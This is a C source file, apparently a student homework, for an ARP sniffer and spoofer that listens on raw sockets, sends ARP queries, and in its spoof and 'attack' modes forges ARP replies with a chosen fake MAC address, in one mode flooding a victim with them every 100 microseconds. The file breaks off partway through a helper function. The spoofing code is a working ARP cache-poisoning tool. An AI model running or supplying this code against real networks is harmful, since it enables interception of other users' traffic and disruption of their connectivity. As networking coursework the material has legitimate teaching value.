
/*     Dependent Library     */
#ifdef WIN32

#define GETUID 0
#define PF_PACKET 16
#define ETH_P_ALL 0x0003
#define PACKET_BROADCAST 1
#define PACKET_OTHERHOST 3
#define PF_PACKET AF_INET

struct sockaddr_ll {
    unsigned short sll_family; /* Always AF_PACKET */
    unsigned short sll_protocol; /* Physical-layer protocol */
    int sll_ifindex; /* Interface number */
    unsigned short sll_hatype; /* ARP hardware type */
    unsigned char sll_pkttype; /* Packet type */
    unsigned char sll_halen; /* Length of address */
    unsigned char sll_addr[8]; /* Physical-layer address */
};

//#include <winsock.h>

#else

#define GETUID getuid()

#include <netinet/in.h>
#include <netpacket/packet.h>
#include <linux/if.h>

#endif

#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <unistd.h>
#include <math.h>
#include "arp.h"

/*     Definition Parameters     */
#define RECV_NORMAL             	0
#define SEND_NORMAL                 0
#define PROTOCOL_ADDR_STR_LENGTH 	16
#define HARDWARE_ADDR_STR_LENGTH	18

#define ETH_PROTOCOL_TYPE_ARP       0x0806
#define HARDWARE_TYPE_ETHERNET      0x0001
#define PROTOCOL_TYPE_IPV4          0x0800
#define OPCODE_REQ                  0x0001
#define OPCODE_REPLY                0x0002

#define CLEAR                   	"\33[H\33[2J"
#define COLOR_NORMAL            	COLOR_GREEN_BLACK
#define COLOR_B_RED              	"\033[1;31m"
#define COLOR_B_WHITE               "\033[1;37m"
#define COLOR_B_YELLOW          	"\033[1;33m"
#define COLOR_B_LIGHTBLUE       	"\033[1;36m"
#define COLOR_B_LIGHTPURPLE     	"\033[1;35m"
#define COLOR_GREEN_BLACK       	"\033[1;32;40m"

#define FLAG_ALL                	"-a"
#define FLAG_LIST               	"-l"
#define FLAG_QUERY              	"-q"
#define FLAG_HELP               	"-help"

#define MSG_WELCOME             	"[ ARP sniffer and spoof program v1.3 ]\n"
#define MSG_SNIFFER_MODE        	"### ARP sniffer mode ###\n"
#define MSG_QUERY_MODE              "### ARP query mode ###\n"
#define MSG_SPOOF_MODE              "### ARP spoof mode (%s) ###\n"
#define MSG_BYE                     "["COLOR_B_RED"System"COLOR_NORMAL"]: Bye!\n\n"
#define MSG_SIGINT                  "\r  \n\n["COLOR_B_RED"System"COLOR_NORMAL"]: Caught signal SIGINT, terminating program...\n"
#define MSG_WAIT_REPLY              "["COLOR_B_RED"System"COLOR_NORMAL"]: Waiting for reply...\n"
#define MSG_WAIT_REQUEST            "["COLOR_B_RED"System"COLOR_NORMAL"]: Waiting for request for "COLOR_B_YELLOW"%s"COLOR_NORMAL"...\n"
#define MSG_WAIT_TARGET_REQ_1       "["COLOR_B_RED"System"COLOR_NORMAL"]: Waiting for "COLOR_B_WHITE"%s"COLOR_NORMAL" request for"
#define MSG_WAIT_TARGET_REQ_2       " "COLOR_B_YELLOW"%s"COLOR_NORMAL"...\n"
#define MSG_FIND_TARGET             "["COLOR_B_RED"System"COLOR_NORMAL"]: Find target IP = "COLOR_B_YELLOW"%s"COLOR_NORMAL"\n"
#define MSG_ARP_GRATUITOUS      	"["COLOR_B_LIGHTPURPLE"ARP Request"COLOR_NORMAL"]: Gratuitous ARP for %s (Request)\n"
#define MSG_ARP_REQUEST         	"["COLOR_B_LIGHTPURPLE"ARP Request"COLOR_NORMAL"]: Who has "COLOR_B_YELLOW"%s"COLOR_NORMAL"? Tell %s\n"
#define MSG_ARP_REQUEST_1           "["COLOR_B_LIGHTPURPLE"ARP Request"COLOR_NORMAL"]: Who has "COLOR_B_YELLOW"%s"COLOR_NORMAL"? Tell "
#define MSG_ARP_REQUEST_2           "%s\n"
#define MSG_ARP_REPLY               "["COLOR_B_LIGHTBLUE"ARP Reply "COLOR_NORMAL"to "COLOR_B_WHITE"%s"COLOR_NORMAL"]: "COLOR_B_YELLOW"%s"COLOR_NORMAL" is at %s\n"

#define ERR_FEW_ARG             	"["COLOR_B_RED"ERROR"COLOR_NORMAL"]: Too few arguments!\nPlease use -help to check usage.\n\n"
#define ERR_MUCH_ARG            	"["COLOR_B_RED"ERROR"COLOR_NORMAL"]: Too much arguments!\nPlease use -help to check usage.\n\n"
#define ERR_WRONG_CMD            	"["COLOR_B_RED"ERROR"COLOR_NORMAL"]: Command not found!\nPlease use -help to check usage.\n\n"
#define ERR_IPADDR_CMD              "["COLOR_B_RED"ERROR"COLOR_NORMAL"]: Command not found or wrong IP address.\nPlease use -help to check usage.\n\n"
#define ERR_NO_ROOT             	"["COLOR_B_RED"ERROR"COLOR_NORMAL"]: You must be root to use this tool!\n\n"
#define ERR_IPADDR              	"["COLOR_B_RED"ERROR"COLOR_NORMAL"]: IP address is incorrect.\nPlease use -help to check usage.\n\n"
#define ERR_MACADDR                 "["COLOR_B_RED"ERROR"COLOR_NORMAL"]: MAC address is incorrect.\nPlease use -help to check usage.\n\n"

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */

#ifndef DEVICE_NAME
#define DEVICE_NAME "enp2s0f5"
#endif

/*     Function Declaration     */
int     check_macaddr(char*);
void    print_help(void);
void    set_arp(struct arp_packet*, uchar* const);
void    sighandler(int);
void    strtomac(uchar*, char* const);
void    uint_32touchar4(uchar*, uint);
ushort  strutons(uchar*);
/*---------------------------------MAIN Function---------------------------------*/

int main(int argc, char* argv[])
{
    int mode = 0, op = 0;
    int sockfd_recv = 0, sockfd_send = 0;
    uchar buf[ARP_PACKET_LENGTH];
    uchar fakemac[TARG_HARDWARE_ADDR_LENGTH];
	struct sockaddr recv;
    struct sockaddr_ll sa;
    struct ifreq req;
    struct in_addr sender_ip, target_ip, attack_ip;
    socklen_t len;
    printf(COLOR_NORMAL"\n");

    /* Check root permission */
    if (GETUID != 0) {
        printf(ERR_NO_ROOT);
        exit(1);
    }

    /* Check arguments */
    if (argc < 2) {
        printf(ERR_FEW_ARG);
        exit(1);
    }

    /* print help */
    if (strcmp(argv[1], FLAG_HELP) == 0) {
        print_help();
        exit(0);
    } 
    
    /* other command */
    else {
        
        /* check # of arguments */
        if (argc < 3) {
            printf(ERR_FEW_ARG);
            exit(1);
        }

        /* check command */
        // listening mode
        if (strcmp(argv[1], FLAG_LIST) == 0){

            if (argc > 3) {
                printf(ERR_MUCH_ARG);
                exit(1);
            }

            mode = 1;

            /* list all */
            if (strcmp(argv[2], FLAG_ALL) == 0) op = 1;

            /* filter mode */
            else {

                /* check ip address is legal */
                if (inet_aton(argv[2], &target_ip) != 0) op = 2;
                else {
                    printf(ERR_IPADDR);
                    exit(1);
                }

            }
        } 
        
        // query mode
        else if (strcmp(argv[1], FLAG_QUERY) == 0) {

            if (argc > 3) {
                printf(ERR_MUCH_ARG);
                exit(1);
            }

            mode = 2;
            
            /* check ip address is legal */
            target_ip.s_addr = inet_addr(argv[2]);
            if (target_ip.s_addr != -1) op = 2;
            else {
                printf(ERR_IPADDR);
                exit(1);
            }
        }

        // daemon mode or attack mode
        else {
            
            mode = 3;

            /* more command */
            if (argc > 3) {
                
                /* check looping command */
                if (argc == 4) {

                    if (strcmp(argv[3], "-t") == 0) 
                        op = 2;

                    else {

                        /* check attack ip address is legal */
                        attack_ip.s_addr = inet_addr(argv[3]);
                        if (attack_ip.s_addr == -1) {
                            printf(ERR_IPADDR_CMD);
                            exit(1);
                        }
                        mode = 4; 

                    }

                /* over 4 arguments */
                } else {

                    printf(ERR_MUCH_ARG);
                    exit(1);

                }

            } else op = 1;

            /* check MAC address is legal */
            if (!check_macaddr(argv[1])) {
                printf(ERR_MACADDR);
                exit(1);
            }

            /* check target ip address is legal */
            target_ip.s_addr = inet_addr(argv[2]);
            if (target_ip.s_addr == -1) {
                printf(ERR_IPADDR);
                exit(1);
            }

            /* transfer mac address format */
            strtomac(fakemac, argv[1]);
            

        }
        

    }
    
    // Open a recv socket in data-link layer.
    if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
    {
        perror(COLOR_B_RED"open recv socket error"COLOR_NORMAL);
        exit(1);
    }

    // Open a send socket in data-link layer.
    if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
    {
        perror(COLOR_B_RED"open send socket error"COLOR_NORMAL);
        exit(1);
    }

    printf(CLEAR);
    printf(MSG_WELCOME);
    signal(SIGINT, sighandler);
    //printf("address: %02X:%02X:%02X:%02X:%02X:%02X\n",fakemac[0],fakemac[1],fakemac[2],fakemac[3],fakemac[4],fakemac[5]);

    switch(mode) {

        /* listening mode */
        case 1:
            len = sizeof(recv);
            printf(MSG_SNIFFER_MODE);
            if (op == 2) printf(MSG_FIND_TARGET, inet_ntoa(target_ip));

            /* Looping catch packets */
            while(1) {
				
				char *tmp, *tmp2, *tmp3;
				struct arp_packet packet;
                memset(buf, 0, ARP_PACKET_LENGTH);
                recvfrom(sockfd_recv, buf, sizeof(buf), RECV_NORMAL, &recv, &len); // catching packets
				set_arp(&packet, buf); // fill arp packet info

				/* list all mode */
				if (op == 1) {

					/* catch ARP packet (Type=0x86) */
                    //printf("%x\n", htons(packet.eth_hdr.ether_type));
					if (htons(packet.eth_hdr.ether_type) == ETH_PROTOCOL_TYPE_ARP) {

						/* ARP Request */
						if (htons(packet.arp.ea_hdr.ar_op) == OPCODE_REQ) {

							// Gratuitous ARP
							if (memcmp(packet.arp.arp_spa, packet.arp.arp_tpa, PROTOCOL_ADDR_LENGTH) == 0) {
								tmp = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
								memset(tmp, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
								get_sender_protocol_addr(&packet.arp, tmp);
								printf(MSG_ARP_GRATUITOUS, tmp);
								free(tmp);
							}
							
							// Normal ARP REQ
							else {
								tmp = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
								tmp2 = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
								memset(tmp, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
								memset(tmp2, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
								get_target_protocol_addr(&packet.arp, tmp);
								get_sender_protocol_addr(&packet.arp, tmp2);
								printf(MSG_ARP_REQUEST, tmp, tmp2);
								free(tmp);
								free(tmp2);
							}
						} 
						
						/* ARP Reply */
						else {
							tmp = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							tmp2 = (char*)malloc(sizeof(char) * HARDWARE_ADDR_STR_LENGTH);
                            tmp3 = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							memset(tmp, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							memset(tmp2, 0, sizeof(HARDWARE_ADDR_STR_LENGTH));
                            memset(tmp3, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							get_sender_protocol_addr(&packet.arp, tmp);
							get_sender_hardware_addr(&packet.arp, tmp2);
                            get_target_protocol_addr(&packet.arp, tmp3);
							printf(MSG_ARP_REPLY, tmp3, tmp, tmp2);
                            free(tmp);
                            free(tmp2);
                            free(tmp3);
						}
						
					}

				}

				/* filter mode */
				else {

                    /* catch ARP packet (Type=0x0806) */
					if (htons(packet.eth_hdr.ether_type) == ETH_PROTOCOL_TYPE_ARP) {
						
						/* ARP Request */
						if (htons(packet.arp.ea_hdr.ar_op) == OPCODE_REQ) {

                            /* when "Gratuitous ARP" or "wrong target ip" skip */
							if (memcmp(packet.arp.arp_spa, packet.arp.arp_tpa, PROTOCOL_ADDR_LENGTH) == 0 || *(u_int32_t*)packet.arp.arp_tpa != target_ip.s_addr) continue;

							tmp = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							tmp2 = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							memset(tmp, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							memset(tmp2, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							get_target_protocol_addr(&packet.arp, tmp);
							get_sender_protocol_addr(&packet.arp, tmp2);
							printf(MSG_ARP_REQUEST, tmp, tmp2);
							free(tmp);
							free(tmp2);

						}

                        /* ARP Reply */
						else {
                            
                            /* when "wrong target IP" skip */
                            if (*(u_int32_t*)packet.arp.arp_tpa != target_ip.s_addr) continue;

							tmp = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							tmp2 = (char*)malloc(sizeof(char) * HARDWARE_ADDR_STR_LENGTH);
                            tmp3 = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							memset(tmp, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							memset(tmp2, 0, sizeof(HARDWARE_ADDR_STR_LENGTH));
                            memset(tmp3, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							get_sender_protocol_addr(&packet.arp, tmp);
							get_sender_hardware_addr(&packet.arp, tmp2);
                            get_target_protocol_addr(&packet.arp, tmp3);
							printf(MSG_ARP_REPLY, tmp3, tmp, tmp2);
                            free(tmp);
                            free(tmp2);
                            free(tmp3);

						}

					}

				}

            }
            break;
        
        /* query mode */
        case 2:
            
            /* send ARP request */
            if (1) {
                
                struct ether_header* eth = (struct ether_header*)buf;
                struct ether_arp* arp = (struct ether_arp*)(buf + 14);

                printf(MSG_QUERY_MODE);
                memset(buf, 0, sizeof(buf));
                
                /* get interface info */
                strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
                if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
                    perror(COLOR_B_RED"get interface info failed"COLOR_NORMAL);
                    exit(1);
                }
                
                /* setup sockaddr_ll structure */
                sa.sll_family   = PF_PACKET;                    // protocol family
                sa.sll_protocol = htons(ETH_PROTOCOL_TYPE_ARP); // Physical-layer protocol
                sa.sll_ifindex  = req.ifr_ifindex;              // interface number
                sa.sll_hatype   = ARPHRD_ETHER;                 // ARP hardware type
                sa.sll_pkttype  = PACKET_BROADCAST;             // packet type
                sa.sll_halen    = 0;                            // Length of address
                memset(sa.sll_addr, 0, sizeof(sa.sll_addr));    // Physical-layer address

                /* get self MAC */
                if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) == -1) {
                    perror(COLOR_B_RED"get self MAC failed"COLOR_NORMAL);
                    exit(1);
                }
                
                /* fill ARP frame */
                // fill ethernet header
                memset(eth->ether_dhost, 255, sizeof(uchar) * ETH_DST_LENGTH); // Ethernet DST address (broadcast=ff:ff:ff:ff:ff:ff) (ff in dec is 255)
                memcpy(eth->ether_shost, req.ifr_hwaddr.sa_data, sizeof(uchar) * ETH_DST_LENGTH); // Ethernet SRC address
                eth->ether_type = htons(ETH_PROTOCOL_TYPE_ARP);
                //printf("Successfully got our MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",req.ifr_hwaddr.sa_data[0],req.ifr_hwaddr.sa_data[1],req.ifr_hwaddr.sa_data[2],req.ifr_hwaddr.sa_data[3],req.ifr_hwaddr.sa_data[4],req.ifr_hwaddr.sa_data[5]);
                //printf("address: %02X:%02X:%02X:%02X:%02X:%02X\n",eth->ether_shost[0],eth->ether_shost[1],eth->ether_shost[2],eth->ether_shost[3],eth->ether_shost[4],eth->ether_shost[5]);
                //printf("%04X\n", eth->ether_type);

                /* get self IP address */
                if (ioctl(sockfd_send, SIOCGIFADDR, &req) == -1) {
                    perror(COLOR_B_RED"get self IP address failed"COLOR_NORMAL);
                    exit(1);
                }

                struct sockaddr_in* addr = (struct sockaddr_in*)&req.ifr_addr;

                // fill ARP request
                arp->ea_hdr.ar_hrd  = htons(HARDWARE_TYPE_ETHERNET);    // hardware type
                arp->ea_hdr.ar_pro  = htons(PROTOCOL_TYPE_IPV4);        // protocol type
                arp->ea_hdr.ar_hln  = HARDWARE_ADDR_LENGTH;             // hardware addr size
                arp->ea_hdr.ar_pln  = PROTOCOL_ADDR_LENGTH;             // protocol addr size
                arp->ea_hdr.ar_op   = htons(OPCODE_REQ);                // opcode

                memcpy(arp->arp_sha, eth->ether_shost, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);          // sender's hardware address
                memcpy(arp->arp_spa, &addr->sin_addr, sizeof(uchar) * SEND_PROTOCOL_ADDR_LENGTH);           // sender's protocol address
                memset(arp->arp_tha, 0, sizeof(uchar) * TARG_HARDWARE_ADDR_LENGTH);                         // target's hardware address (not set)
                memcpy(arp->arp_tpa, &target_ip.s_addr, sizeof(uchar) * TARG_PROTOCOL_ADDR_LENGTH);         // target's protocol address
                
                // send ARP request
                if (sendto(sockfd_send, buf, sizeof(buf), SEND_NORMAL, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
                    perror(COLOR_B_RED"sendto():"COLOR_NORMAL);
                    exit(1);
                }
                
                // print request message
                printf(MSG_ARP_REQUEST_1, inet_ntoa(*(struct in_addr*)&arp->arp_tpa));
                printf(MSG_ARP_REQUEST_2, inet_ntoa(*(struct in_addr*)&arp->arp_spa));

                printf(MSG_WAIT_REPLY);
                memcpy(&sender_ip.s_addr, &arp->arp_tpa, sizeof(uchar) * SEND_PROTOCOL_ADDR_LENGTH); // filter sender's IP for target IP
            }

            /* receive ARP reply */
            while (1) {

                char *tmp, *tmp2, *tmp3;
				struct arp_packet packet;
                memset(buf, 0, ARP_PACKET_LENGTH);
                recvfrom(sockfd_recv, buf, sizeof(buf), RECV_NORMAL, &recv, &len); // catching packets
				set_arp(&packet, buf); // fill arp packet info

                /* catch ARP packet (Type=0x0806) */
                if (htons(packet.eth_hdr.ether_type) == ETH_PROTOCOL_TYPE_ARP) {
                    
                    /* ARP Request */
                    if (htons(packet.arp.ea_hdr.ar_op) == OPCODE_REPLY) {

                        /* when "wrong sender IP" skip */
                        if (*(u_int32_t*)packet.arp.arp_spa != sender_ip.s_addr) continue;

							tmp = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							tmp2 = (char*)malloc(sizeof(char) * HARDWARE_ADDR_STR_LENGTH);
                            tmp3 = (char*)malloc(sizeof(char) * PROTOCOL_ADDR_STR_LENGTH);
							memset(tmp, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							memset(tmp2, 0, sizeof(HARDWARE_ADDR_STR_LENGTH));
                            memset(tmp3, 0, sizeof(PROTOCOL_ADDR_STR_LENGTH));
							get_sender_protocol_addr(&packet.arp, tmp);
							get_sender_hardware_addr(&packet.arp, tmp2);
                            get_target_protocol_addr(&packet.arp, tmp3);
							printf(MSG_ARP_REPLY"\n", tmp3, tmp, tmp2);
                            free(tmp);
                            free(tmp2);
                            free(tmp3);

                        break;

                    }

                }

            }
            break;
        
        /* daemon mode */
        case 3:

            if (op == 1) printf(MSG_SPOOF_MODE, "single mode");
            else         printf(MSG_SPOOF_MODE, "loop mode");
            
            /* looping attack others */
            while (1) {
                
                len = sizeof(recv);
                uchar arp_tha[SEND_HARDWARE_ADDR_LENGTH], arp_tpa[SEND_PROTOCOL_ADDR_LENGTH];
                struct ether_header* eth = (struct ether_header*)buf;
                struct ether_arp* arp = (struct ether_arp*)(buf + 14);
                printf(MSG_WAIT_REQUEST, inet_ntoa(*(struct in_addr*)&target_ip.s_addr));

                /* Looping catch packets until ARP request packet receive */
                while(1) {
                    
                    struct arp_packet packet;
                    memset(buf, 0, ARP_PACKET_LENGTH);
                    recvfrom(sockfd_recv, buf, sizeof(buf), RECV_NORMAL, &recv, &len); // catching packets
                    set_arp(&packet, buf); // fill arp packet info

                    /* catch ARP packet (Type=0x0806) */
                    if (htons(packet.eth_hdr.ether_type) == ETH_PROTOCOL_TYPE_ARP) {
                        
                        /* ARP Request */
                        if (htons(packet.arp.ea_hdr.ar_op) == OPCODE_REQ) {

                            /* when "wrong target ip" skip */
                            if (*(u_int32_t*)packet.arp.arp_tpa != target_ip.s_addr) continue;

                            /* get IP & MAC of sender */
                            memcpy(arp_tha, packet.arp.arp_sha, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);
                            memcpy(arp_tpa, packet.arp.arp_spa, sizeof(uchar) * SEND_PROTOCOL_ADDR_LENGTH);
                            break;

                        }

                    }

				}
                
                // print request message
                printf(MSG_ARP_REQUEST_1, inet_ntoa(*(struct in_addr*)&target_ip));
                printf(MSG_ARP_REQUEST_2, inet_ntoa(*(struct in_addr*)&arp_tpa));
                memset(buf, 0, sizeof(buf));
                
                /* get interface info */
                strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
                if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
                    perror(COLOR_B_RED"get interface info failed"COLOR_NORMAL);
                    exit(1);
                }
                
                /* setup sockaddr_ll structure */
                sa.sll_family   = PF_PACKET;                    // protocol family
                sa.sll_protocol = htons(ETH_PROTOCOL_TYPE_ARP); // Physical-layer protocol
                sa.sll_ifindex  = req.ifr_ifindex;              // interface number
                sa.sll_hatype   = ARPHRD_ETHER;                 // ARP hardware type
                sa.sll_pkttype  = PACKET_OTHERHOST;             // packet type
                sa.sll_halen    = 0;                            // Length of address
                memset(sa.sll_addr, 0, sizeof(sa.sll_addr));
                memcpy(sa.sll_addr, arp_tha, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);            // DST MAC address

                /* get self MAC */
                if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) == -1) {
                    perror(COLOR_B_RED"get self MAC failed"COLOR_NORMAL);
                    exit(1);
                }
                
                /* fill ARP frame */
                // fill ethernet header
                memcpy(eth->ether_dhost, arp_tha, sizeof(uchar) * ETH_DST_LENGTH);                  // Ethernet DST address
                memcpy(eth->ether_shost, req.ifr_hwaddr.sa_data, sizeof(uchar) * ETH_DST_LENGTH);   // Ethernet SRC address
                eth->ether_type = htons(ETH_PROTOCOL_TYPE_ARP);                                     // Ehternet protocol type

                // fill ARP request
                arp->ea_hdr.ar_hrd  = htons(HARDWARE_TYPE_ETHERNET);    // hardware type
                arp->ea_hdr.ar_pro  = htons(PROTOCOL_TYPE_IPV4);        // protocol type
                arp->ea_hdr.ar_hln  = HARDWARE_ADDR_LENGTH;             // hardware addr size
                arp->ea_hdr.ar_pln  = PROTOCOL_ADDR_LENGTH;             // protocol addr size
                arp->ea_hdr.ar_op   = htons(OPCODE_REPLY);              // opcode

                memcpy(arp->arp_sha, &fakemac, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);                 // sender's hardware address
                memcpy(arp->arp_spa, &target_ip.s_addr, sizeof(uchar) * SEND_PROTOCOL_ADDR_LENGTH);        // sender's protocol address
                memcpy(arp->arp_tha, arp_tha, sizeof(uchar) * TARG_HARDWARE_ADDR_LENGTH);                  // target's hardware address
                memcpy(arp->arp_tpa, arp_tpa, sizeof(uchar) * TARG_PROTOCOL_ADDR_LENGTH);                  // target's protocol address
                
                // send ARP reply
                if (sendto(sockfd_send, buf, sizeof(buf), SEND_NORMAL, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
                    perror(COLOR_B_RED"sendto():"COLOR_NORMAL);
                    exit(1);
                }
                
                // print reply message
                char tmp[PROTOCOL_ADDR_STR_LENGTH];
                memset(tmp, 0, sizeof(tmp));
                memcpy(tmp, inet_ntoa(*(struct in_addr*)&arp_tpa), sizeof(tmp));
                printf(MSG_ARP_REPLY"\n", tmp, argv[2], argv[1]);

                // single command
                if (op == 1) break;

            }
            break;

        /* attack mode */
        case 4:

            printf(MSG_SPOOF_MODE, "loop mode");

            if (1) {    

                len = sizeof(recv);
                uchar arp_tha[SEND_HARDWARE_ADDR_LENGTH];
                struct ether_header* eth = (struct ether_header*)buf;
                struct ether_arp* arp = (struct ether_arp*)(buf + 14);
                char tarip[PROTOCOL_ADDR_STR_LENGTH], attip[PROTOCOL_ADDR_STR_LENGTH];
                memset(tarip, 0, sizeof (tarip));
                memset(attip, 0, sizeof (attip));
                memcpy(tarip, inet_ntoa(*(struct in_addr*)&target_ip.s_addr), sizeof(tarip));
                memcpy(attip, inet_ntoa(*(struct in_addr*)&attack_ip.s_addr), sizeof(attip));
                printf(MSG_WAIT_TARGET_REQ_1, attip);
                printf(MSG_WAIT_TARGET_REQ_2, tarip);

                /* Looping catch packets until ARP request packet receive */
                while(1) {
                    
                    struct arp_packet packet;
                    memset(buf, 0, ARP_PACKET_LENGTH);
                    recvfrom(sockfd_recv, buf, sizeof(buf), RECV_NORMAL, &recv, &len); // catching packets
                    set_arp(&packet, buf); // fill arp packet info

                    /* catch ARP packet (Type=0x0806) */
                    if (htons(packet.eth_hdr.ether_type) == ETH_PROTOCOL_TYPE_ARP) {
                        
                        /* ARP Request */
                        if (htons(packet.arp.ea_hdr.ar_op) == OPCODE_REQ) {

                            /* when "wrong target ip" skip */
                            if (*(u_int32_t*)packet.arp.arp_spa != attack_ip.s_addr) continue;

                            /* get IP & MAC of sender */
                            memcpy(arp_tha, packet.arp.arp_sha, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);
                            break;

                        }

                    }

                }
                
                /* send fake ARP reply */
                memset(buf, 0, sizeof(buf));
                
                /* get interface info */
                strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
                if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
                    perror(COLOR_B_RED"get interface info failed"COLOR_NORMAL);
                    exit(1);
                }
                
                /* setup sockaddr_ll structure */
                sa.sll_family   = PF_PACKET;                    // protocol family
                sa.sll_protocol = htons(ETH_PROTOCOL_TYPE_ARP); // Physical-layer protocol
                sa.sll_ifindex  = req.ifr_ifindex;              // interface number
                sa.sll_hatype   = ARPHRD_ETHER;                 // ARP hardware type
                sa.sll_pkttype  = PACKET_OTHERHOST;             // packet type
                sa.sll_halen    = 0;                            // Length of address
                memset(sa.sll_addr, 0, sizeof(sa.sll_addr));
                memcpy(sa.sll_addr, arp_tha, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);            // DST MAC address

                /* get self MAC */
                if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) == -1) {
                    perror(COLOR_B_RED"get self MAC failed"COLOR_NORMAL);
                    exit(1);
                }
                
                /* fill ARP frame */
                // fill ethernet header
                memcpy(eth->ether_dhost, arp_tha, sizeof(uchar) * ETH_DST_LENGTH);                  // Ethernet DST address
                memcpy(eth->ether_shost, req.ifr_hwaddr.sa_data, sizeof(uchar) * ETH_DST_LENGTH);   // Ethernet SRC address
                eth->ether_type = htons(ETH_PROTOCOL_TYPE_ARP);                                     // Ehternet protocol type

                // fill ARP request
                arp->ea_hdr.ar_hrd  = htons(HARDWARE_TYPE_ETHERNET);    // hardware type
                arp->ea_hdr.ar_pro  = htons(PROTOCOL_TYPE_IPV4);        // protocol type
                arp->ea_hdr.ar_hln  = HARDWARE_ADDR_LENGTH;             // hardware addr size
                arp->ea_hdr.ar_pln  = PROTOCOL_ADDR_LENGTH;             // protocol addr size
                arp->ea_hdr.ar_op   = htons(OPCODE_REPLY);              // opcode

                memcpy(arp->arp_sha, &fakemac, sizeof(uchar) * SEND_HARDWARE_ADDR_LENGTH);                 // sender's hardware address
                memcpy(arp->arp_spa, &target_ip.s_addr, sizeof(uchar) * SEND_PROTOCOL_ADDR_LENGTH);        // sender's protocol address
                memcpy(arp->arp_tha, arp_tha, sizeof(uchar) * TARG_HARDWARE_ADDR_LENGTH);                  // target's hardware address
                memcpy(arp->arp_tpa, &attack_ip, sizeof(uchar) * TARG_PROTOCOL_ADDR_LENGTH);               // target's protocol address

                /* looping attack */
                while (1) {
                
                    // send ARP request
                    if (sendto(sockfd_send, buf, sizeof(buf), SEND_NORMAL, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
                        perror(COLOR_B_RED"sendto():"COLOR_NORMAL);
                        exit(1);
                    }

                    // print reply message
                    printf(MSG_ARP_REPLY, attip, tarip, argv[1]);

                    usleep(100);

                }

            }
    }

    return 0;
}

/*---------------------------------Other Functions---------------------------------*/

/*
 *	Print welcome message.
 *	Input:	void
 *  Output:	void
 */
void print_help(void) {

    printf(MSG_WELCOME);
    printf("Format :\n");
    printf("1) ./arp -l -a\n");
    printf("2) ./arp -l <filter_ip_address>\n");
    printf("3) ./arp -q <query_ip_address>\n");
    printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
    printf("5) ./arp <fake_mac_address> <target_ip_address> -t\n");
    printf("6) ./arp <fake_mac_address> <target_ip_address> <attack_ip_address>\n\n");

}

/*
 *	Check MAC address format.
 *	Input:	address
 *  Output: 1 or 0 (correct or incorrect)
 */
int check_macaddr(char* addr) {

    int i, len;
    char* ptr = addr;

    len = strlen(addr);
    if (len != 17) return 0;

    for (i = 1; i <= 17; i++, ptr++) {

        if (i % 3 == 0) continue;
        if (*ptr >= 'A' && *ptr <= 'F') *ptr = *ptr - 'A' + 'a'; // convert to little letter
        if (!(*ptr >= 'a' && *ptr <= 'f') && !(*ptr >= '0' && *ptr <= '9')) {
            return 0;
        }
    
    }
    return 1;
}

/*
 *	Transfer unsigned char to unsigned short.
 *	Input:	unsigned
 *  Output:	unsigned short
 */
ushort strutons(uchar* src) {

    int i;
    ushort val;
    uchar* tmp = (uchar*)malloc(sizeof(uchar) * 3);
    memset(tmp, 0, sizeof(uchar) * 3);

    for (i = 0; i < 2; i++) {
        tmp[i] = src[i];
    }
    val = *(ushort*)tmp;

    free(tmp);
    return val; 

}

/*
 *	Convert unsigned int to unsigned char.
 *	Input:	converted string, value to convert
 *  Output:	void
 */
void uint_32touchar4(uchar* str, uint val) {
    
    str[3] = val >> 24;
    str[2] = val >> 16;
    str[1] = val >> 8;
    str[0] = val;

}

/*
 *	Convert char string to mac address.
 *	Input:	mac address, char string
 *  Output:	void
 */
void strtomac(uchar* hex, char* const str) {
    
    int i, j, idx = 0;

